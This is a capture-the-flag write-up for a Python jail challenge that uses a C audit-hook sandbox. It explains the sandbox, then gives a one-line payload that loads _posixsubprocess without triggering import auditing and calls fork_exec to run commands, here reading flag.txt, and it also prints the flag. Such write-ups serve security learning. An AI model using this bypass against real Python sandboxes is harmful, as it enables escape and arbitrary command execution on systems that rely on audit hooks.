# **obligatory pyjail**
a pyjail

## **Description**
We are given a host and port to connect to as well as a few files. 

`jail.py` contains the python jail main program that is running on the server.
```py
# python3.10 jail.py build
import os
from distutils.core import Extension, setup
if not os.path.exists("./audit_sandbox.so"):
  setup(name='audit_sandbox', ext_modules=[
        Extension('audit_sandbox', ['audit_sandbox.c'])],)
  os.popen("cp build/lib*/audit_sandbox* audit_sandbox.so")
del os
import sys
cod = input(">>> ")
import audit_sandbox
audit_sandbox.install_hook()
del audit_sandbox
del sys.modules['audit_sandbox']
del sys
print(eval(cod))
```

In addition, we are given an `audit_sandbox.c`. This sets up the audit hook that is installed in the `jail.py` file. The hook_func is the most important.
```c
static const char *allow_list[] = {"compile", "exec"};
static const unsigned int allow_list_len = sizeof(allow_list) / sizeof(char *);

static int hook_func(const char *event, PyObject *args, void *userData)
{
    char *ev, *str, *part, *saveptr;
    unsigned int i;
    fprintf(stderr, "native audit log: event = %s\n", event);
    if (!(ev = strdup(event)))
    {
        fputs("Insufficient memory.\n", stderr);
        exit(EXIT_FAILURE);
    }
    fprintf(stderr, "native audit log: event = %s\n", part);
    for (str = ev;; str = NULL)
    {
        part = strtok_r(str, ".", &saveptr);
        if (!part)
            break;
        for (i = 0; i < allow_list_len; ++i)
        {
            if (!strcmp(part, allow_list[i]))
            {
                fprintf(stderr, "native audit log: allowed event = %s\n", part);
                free(ev);
                return 0;
            }
        }
        if (!part) {
            free(ev);
            return 0;
        }
        fprintf(stderr, "native audit log: banned event = %s\n", event);
        free(ev);
        exit(EXIT_FAILURE);
        return 0;
    }
    return 0;
}
```

The audit sandbox bans all audit events thats not `exec` or `compile`.

We can find the list of audit events on the python docs audit event [table](https://docs.python.org/3/library/audit_events.html). Generally anything that accesses file io, reads files, even import, raises an audit event. 


## **Solution**
While playing around with it, I realized that certain imports were not banned. For example,
```py
__import__('os')
__import__('sys')
```

While this will be useful for the final solve, it was still a bit far away. I also noted the comment at the top of the audit sandbox file, that said,
```c
// also stolen from 0ctf pyaucalc
```

In one of the [writeups](https://flagbot.ch/posts/pyaucalc/), they mention the use of `_posixsubprocess.fork_exec`. While this was not used in the that CTF, it got me curious. Looking into it, I found that that function essentially performs exec at a much lower level than what is caught by audit events, as it is written in C. 

We can import `_posixsubprocess` using the `__loader__.load_module` method, which does not raise the `import` audit event. We also do need `os.pipe()`, but this is not a problem as we previously saw that importing os does not raise an audit event.

The final payload was the following.
```py
__builtins__.__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat", b'flag.txt'], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__('os').pipe()), False, False, None, None, None, -1, None)
```

---
## **Flag**: `LITCTF{pls_dont_priv_esc_or_nuke_stuff_kthx_bye}`
---